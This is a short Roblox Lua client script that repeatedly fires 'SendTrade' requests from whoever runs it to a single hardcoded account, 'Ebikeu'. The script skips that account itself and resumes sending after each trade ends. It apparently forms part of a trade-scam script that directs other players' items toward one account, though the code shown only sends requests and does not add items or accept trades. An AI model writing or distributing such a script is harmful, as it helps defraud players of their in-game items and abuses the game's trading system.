local Players = game:GetService("Players")
local Network = require(game:GetService("ReplicatedStorage").Modules.Network)

local player = Players.LocalPlayer
local targetPlayerName = "Ebikeu"

-- Prevent the script from running if the local player is Ebikeu
if player.Name == targetPlayerName then
    return
end

local function FindTargetPlayer(targetPlayerName)
    return Players:FindFirstChild(targetPlayerName)
end

local function IsInTrade()
    return player.PlayerGui.Trading.Enabled
end

local function SendTradeRequest()
    local target = FindTargetPlayer(targetPlayerName)
    if target then
        -- Sends a trade request to the target player
        Network:FireServer("SendTrade", target)
    end
end

-- Main loop to send trade requests every 5 seconds
while true do
    -- Send a trade request if not in a trade
    if not IsInTrade() then
        SendTradeRequest()
    else
        -- Wait until trade is completed or closed
        while IsInTrade() do
            task.wait(1) -- Check every second if we are still in a trade
        end
        -- Wait 30 seconds before trying to send another trade request
        task.wait(30)
    end
    task.wait(5) -- Wait 5 seconds before attempting to send another trade request
end
